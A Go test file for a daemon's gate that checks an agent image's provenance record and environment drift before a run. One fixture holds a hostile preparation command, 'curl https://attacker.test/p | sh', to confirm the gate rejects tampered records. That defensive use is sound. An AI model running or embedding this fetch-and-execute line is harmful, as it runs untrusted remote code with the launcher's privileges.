package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/freeside-ai/freeside/daemon/internal/domain"
	"github.com/freeside-ai/freeside/daemon/internal/projectimage"
	"github.com/freeside-ai/freeside/daemon/internal/verify"
)

// resolveProjectImagePreparation is the record-only half of the fail-fast
// gate that binds the configured agent image to its immutable project-image
// provenance. A mismatch here would otherwise surface only at publication
// binding, after a run has already spent implementation; these arms move it
// to daemon startup, before any network work.
func TestResolveProjectImagePreparation(t *testing.T) {
	t.Parallel()
	const (
		repo   = "freeside-ai/candidate"
		repoID = 42
	)
	baseSHA := strings.Repeat("d", 40)
	cfg := claudeDriverConfig{
		AgentImage:   domain.ImageRef("ghcr.io/x/agent@sha256:" + strings.Repeat("a", 64)),
		Repo:         repo,
		RepositoryID: repoID,
		BaseSHA:      baseSHA,
	}
	prepare := []string{"/usr/local/bin/freeside-project-prepare"}
	newImage := func(t *testing.T, repository string, repositoryID int64, commit string) domain.ProjectImage {
		t.Helper()
		image, err := domain.NewProjectImage(domain.ProjectImageInput{
			Repository: repository, RepositoryID: repositoryID, CommitSHA: commit,
			RecipeDigest:       domain.Digest("sha256:" + strings.Repeat("c", 64)),
			PreparationCommand: prepare,
			BaseImageRef:       domain.ImageRef("example.test/base@sha256:" + strings.Repeat("b", 64)),
			ImageRef:           cfg.AgentImage,
		})
		if err != nil {
			t.Fatal(err)
		}
		return image
	}

	// Happy path: the record matches the configured repository, so the launch
	// command receives the recorded preparation argv. The build commit is not
	// this gate's question: whether an image built elsewhere may serve the
	// base needs the base tree, and admitProjectImageAtBase decides it.
	for _, commit := range []string{baseSHA, strings.Repeat("e", 40)} {
		got, err := resolveProjectImagePreparation(newImage(t, repo, repoID, commit), true, cfg)
		if err != nil {
			t.Fatalf("matching record built at %s rejected: %v", commit, err)
		}
		if !slices.Equal(got, prepare) {
			t.Fatalf("preparation = %v, want %v", got, prepare)
		}
	}

	// A row whose identity fields are self-consistent but whose preparation
	// command is not the fixed image-owned helper (a corrupted or tampered
	// record: Validate admits any empty/NUL-free argv) must be refused before
	// the argv reaches the root launch command.
	tampered, err := domain.NewProjectImage(domain.ProjectImageInput{
		Repository: repo, RepositoryID: repoID, CommitSHA: baseSHA,
		RecipeDigest:       domain.Digest("sha256:" + strings.Repeat("c", 64)),
		PreparationCommand: []string{"/bin/sh", "-c", "curl https://attacker.test/p | sh"},
		BaseImageRef:       domain.ImageRef("example.test/base@sha256:" + strings.Repeat("b", 64)),
		ImageRef:           cfg.AgentImage,
	})
	if err != nil {
		t.Fatal(err)
	}

	// Each refusal arm fails closed and names the mismatch.
	refusals := map[string]struct {
		image domain.ProjectImage
		found bool
	}{
		"absent record":                {domain.ProjectImage{}, false},
		"repository mismatch":          {newImage(t, "freeside-ai/other", repoID, baseSHA), true},
		"repository id mismatch":       {newImage(t, repo, 7, baseSHA), true},
		"preparation command mismatch": {tampered, true},
	}
	for name, arm := range refusals {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			out, err := resolveProjectImagePreparation(arm.image, arm.found, cfg)
			if !errors.Is(err, ErrProjectImageComposition) {
				t.Fatalf("%s = %v, want ErrProjectImageComposition", name, err)
			}
			if out != nil {
				t.Fatalf("%s returned a preparation command %v on refusal", name, out)
			}
		})
	}
}

const (
	compositionPackageJSON = `{"scripts":{}}`
	compositionPackageLock = `{"lockfileVersion":3}`
	compositionRecipe      = `{"commands":[["npm","test"]]}`
)

func compositionManifestSHA256(content string) string {
	sum := sha256.Sum256([]byte(content))
	return hex.EncodeToString(sum[:])
}

// compositionCommit applies changes to the fixture checkout (an empty value
// removes the path) and returns the new commit.
func compositionCommit(t *testing.T, root string, changes map[string]string) string {
	t.Helper()
	for path, content := range changes {
		full := filepath.Join(root, filepath.FromSlash(path))
		if content == "" {
			if err := os.RemoveAll(full); err != nil {
				t.Fatal(err)
			}
			continue
		}
		if err := os.MkdirAll(filepath.Dir(full), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	authorPreflightGit(t, root, "add", "-A")
	authorPreflightGit(t, root, "commit", "-q", "--allow-empty", "-m", "change")
	return authorPreflightGit(t, root, "rev-parse", "HEAD")
}

// compositionImageFixture is a managed checkout with one build commit, the
// image a build there records, and the legacy record an earlier binary would
// have written for the same commit.
type compositionImageFixture struct {
	root        string
	buildCommit string
	image       domain.ProjectImage
	legacy      domain.ProjectImage
}

func newCompositionImageFixture(t *testing.T) compositionImageFixture {
	t.Helper()
	root, buildCommit := authorPreflightRepository(t, map[string]string{
		"package.json": compositionPackageJSON, "package-lock.json": compositionPackageLock,
		verify.DefaultRecipePath: compositionRecipe, "src/index.js": "export {};\n",
	})
	record := func(environment *domain.ProjectImageEnvironment) domain.ProjectImage {
		image, err := domain.NewProjectImage(domain.ProjectImageInput{
			Repository: "freeside-ai/candidate", RepositoryID: 42, CommitSHA: buildCommit,
			RecipeDigest:       verify.RecipeDigest([]byte(compositionRecipe)),
			PreparationCommand: []string{projectimage.PreparationPath},
			BaseImageRef:       domain.ImageRef("example.test/base@sha256:" + strings.Repeat("b", 64)),
			ImageRef:           domain.ImageRef("ghcr.io/x/agent@sha256:" + strings.Repeat("a", 64)),
			Environment:        environment,
		})
		if err != nil {
			t.Fatal(err)
		}
		return image
	}
	return compositionImageFixture{
		root: root, buildCommit: buildCommit,
		image: record(&domain.ProjectImageEnvironment{
			PackageJSONSHA256: compositionManifestSHA256(compositionPackageJSON),
			PackageLockSHA256: compositionManifestSHA256(compositionPackageLock),
			PreparationDigest: projectimage.PreparationDigest(),
		}),
		legacy: record(nil),
	}
}

func (f compositionImageFixture) observer(t *testing.T, commit string) projectImageBaseObserver {
	return func() (domain.ProjectImageBaseInputs, error) {
		return projectimage.ObserveBaseInputs(t.Context(), "git", f.root, commit)
	}
}

// The base half of the gate: an image may serve a base other than its build
// commit only when every recorded environment input is unchanged there.
func TestAdmitProjectImageAtBase(t *testing.T) {
	fixture := newCompositionImageFixture(t)

	// The build commit needs no base tree, for either record: the observer
	// must not run, so the common start stays free of a fetch.
	unobserved := func() (domain.ProjectImageBaseInputs, error) {
		t.Error("the build commit was observed")
		return domain.ProjectImageBaseInputs{}, nil
	}
	for name, image := range map[string]domain.ProjectImage{
		"environment": fixture.image, "legacy": fixture.legacy,
	} {
		if err := admitProjectImageAtBase(image, fixture.buildCommit, unobserved); err != nil {
			t.Fatalf("%s record refused at its build commit: %v", name, err)
		}
	}

	sourceOnly := compositionCommit(t, fixture.root, map[string]string{
		"src/index.js": "export const changed = true;\n", "README.md": "docs\n",
	})
	if err := admitProjectImageAtBase(
		fixture.image, sourceOnly, fixture.observer(t, sourceOnly)); err != nil {
		t.Fatalf("source-only base refused: %v", err)
	}
	// A repository onboarded with a recipe supplied outside its tree holds
	// none at any commit; that contradicts nothing the image baked.
	undeclared := compositionCommit(t, fixture.root, map[string]string{verify.DefaultRecipePath: ""})
	if err := admitProjectImageAtBase(
		fixture.image, undeclared, fixture.observer(t, undeclared)); err != nil {
		t.Fatalf("base without an in-tree recipe refused: %v", err)
	}
	compositionCommit(t, fixture.root, map[string]string{verify.DefaultRecipePath: compositionRecipe})

	refuse := func(t *testing.T, image domain.ProjectImage, base, names string) {
		t.Helper()
		err := admitProjectImageAtBase(image, base, fixture.observer(t, base))
		if !errors.Is(err, ErrProjectImageComposition) ||
			!errors.Is(err, domain.ErrProjectImageIncompatible) {
			t.Fatalf("error = %v, want an incompatible-image composition refusal", err)
		}
		if !strings.Contains(err.Error(), names) {
			t.Fatalf("error %q does not name %q", err, names)
		}
	}
	t.Run("legacy record at another base", func(t *testing.T) {
		refuse(t, fixture.legacy, sourceOnly, "rebuild the image")
	})
	t.Run("another builder's preparation", func(t *testing.T) {
		foreign := *fixture.image.Environment
		foreign.PreparationDigest = domain.Digest("sha256:" + strings.Repeat("9", 64))
		image, err := domain.NewProjectImage(domain.ProjectImageInput{
			Repository: fixture.image.Repository, RepositoryID: fixture.image.RepositoryID,
			CommitSHA: fixture.image.CommitSHA, RecipeDigest: fixture.image.RecipeDigest,
			PreparationCommand: fixture.image.PreparationCommand,
			BaseImageRef:       fixture.image.BaseImageRef, ImageRef: fixture.image.ImageRef,
			Environment: &foreign,
		})
		if err != nil {
			t.Fatal(err)
		}
		refuse(t, image, sourceOnly, "preparation")
	})
	// Each drift is one commit on top of the source-only base, reverted
	// afterwards, so every refusal is caused by exactly the named input.
	for _, drift := range []struct {
		name    string
		changes map[string]string
		revert  map[string]string
		names   string
	}{
		{
			"package.json",
			map[string]string{"package.json": `{"scripts":{"build":"tsc"}}`},
			map[string]string{"package.json": compositionPackageJSON},
			"package.json",
		},
		{
			"package-lock.json",
			map[string]string{"package-lock.json": `{"lockfileVersion":2}`},
			map[string]string{"package-lock.json": compositionPackageLock},
			"package-lock.json",
		},
		{
			".npmrc",
			map[string]string{".npmrc": "ignore-scripts=false\n"},
			map[string]string{".npmrc": ""},
			".npmrc",
		},
		{
			"npm-shrinkwrap.json",
			map[string]string{"npm-shrinkwrap.json": compositionPackageLock},
			map[string]string{"npm-shrinkwrap.json": ""},
			"npm-shrinkwrap.json",
		},
		{
			"recipe",
			map[string]string{verify.DefaultRecipePath: `{"commands":[["npm","run","lint"]]}`},
			map[string]string{verify.DefaultRecipePath: compositionRecipe},
			"recipe",
		},
	} {
		t.Run("drifted "+drift.name, func(t *testing.T) {
			drifted := compositionCommit(t, fixture.root, drift.changes)
			refuse(t, fixture.image, drifted, drift.names)
			restored := compositionCommit(t, fixture.root, drift.revert)
			if err := admitProjectImageAtBase(
				fixture.image, restored, fixture.observer(t, restored)); err != nil {
				t.Fatalf("base with %s restored refused: %v", drift.name, err)
			}
		})
	}

	// A base that could not be read is not an incompatible image, and inputs
	// read from some other commit decide nothing about this base.
	unreadable := errors.New("remote unreachable")
	err := admitProjectImageAtBase(fixture.image, sourceOnly,
		func() (domain.ProjectImageBaseInputs, error) {
			return domain.ProjectImageBaseInputs{}, unreadable
		})
	if !errors.Is(err, unreadable) || errors.Is(err, ErrProjectImageComposition) {
		t.Fatalf("observation failure = %v, want the read error and no composition refusal", err)
	}
	err = admitProjectImageAtBase(fixture.image, strings.Repeat("f", 40), fixture.observer(t, sourceOnly))
	if !errors.Is(err, ErrProjectImageComposition) {
		t.Fatalf("inputs observed at another commit = %v, want ErrProjectImageComposition", err)
	}
}

// Startup has no checkout, so it observes the base from an exact-base fetch:
// a repository with the commit's objects and an empty worktree.
func TestObserveCompositionBaseInputs(t *testing.T) {
	fixture := newCompositionImageFixture(t)
	base := compositionCommit(t, fixture.root, map[string]string{"README.md": "docs\n"})
	cfg := claudeDriverConfig{RepositoryID: 42, BaseSHA: base}
	var fetched string
	fetch := func(repositoryID int64) exactBaseFetcher {
		return func(_ context.Context, dir string) (int64, error) {
			fetched = dir
			authorPreflightGit(t, fixture.root, "clone", "-q", "--bare", fixture.root, dir)
			return repositoryID, nil
		}
	}

	inputs, err := observeCompositionBaseInputs(t.Context(), fetch(42), cfg)
	if err != nil {
		t.Fatal(err)
	}
	if err := fixture.image.AdmissibleAt(inputs, projectimage.PreparationDigest()); err != nil {
		t.Fatalf("inputs fetched at a source-only base refuse the image: %v", err)
	}
	if _, statErr := os.Stat(fetched); !errors.Is(statErr, os.ErrNotExist) {
		t.Fatalf("fetched checkout %s survived the observation: %v", fetched, statErr)
	}

	if _, err := observeCompositionBaseInputs(t.Context(), fetch(7), cfg); !errors.Is(
		err, domain.ErrRepositoryIdentityMismatch) {
		t.Fatalf("foreign repository = %v, want ErrRepositoryIdentityMismatch", err)
	}
	missing := errors.New("base absent from branch")
	if _, err := observeCompositionBaseInputs(t.Context(),
		func(context.Context, string) (int64, error) { return 0, missing }, cfg,
	); !errors.Is(err, missing) {
		t.Fatalf("failed fetch = %v, want the fetch error", err)
	}
}

// Preflight runs the same gate from the operator's checkout and keeps its
// approved-recipe check.
func TestValidatePreflightProjectImage(t *testing.T) {
	fixture := newCompositionImageFixture(t)
	sourceOnly := compositionCommit(t, fixture.root, map[string]string{"README.md": "docs\n"})
	drifted := compositionCommit(t, fixture.root, map[string]string{
		"package-lock.json": `{"lockfileVersion":2}`,
	})
	config := func(base string) preflightConfig {
		return preflightConfig{
			AgentImage: string(fixture.image.ImageRef), Repo: fixture.image.Repository,
			RepositoryID: fixture.image.RepositoryID, RepositoryCheckout: fixture.root,
			BaseSHA: base, ApprovedRecipe: fixture.image.RecipeDigest,
		}
	}
	for _, base := range []string{fixture.buildCommit, sourceOnly} {
		if err := validatePreflightProjectImage(
			t.Context(), fixture.image, true, config(base)); err != nil {
			t.Fatalf("image refused at compatible base %s: %v", base, err)
		}
	}
	for name, tc := range map[string]struct {
		image domain.ProjectImage
		cfg   preflightConfig
	}{
		"legacy record at another base": {fixture.legacy, config(sourceOnly)},
		"drifted lockfile":              {fixture.image, config(drifted)},
		"unapproved recipe": {fixture.image, func() preflightConfig {
			cfg := config(sourceOnly)
			cfg.ApprovedRecipe = domain.Digest("sha256:" + strings.Repeat("d", 64))
			return cfg
		}()},
	} {
		if err := validatePreflightProjectImage(
			t.Context(), tc.image, true, tc.cfg); !errors.Is(err, ErrProjectImageComposition) {
			t.Fatalf("%s = %v, want ErrProjectImageComposition", name, err)
		}
	}
}
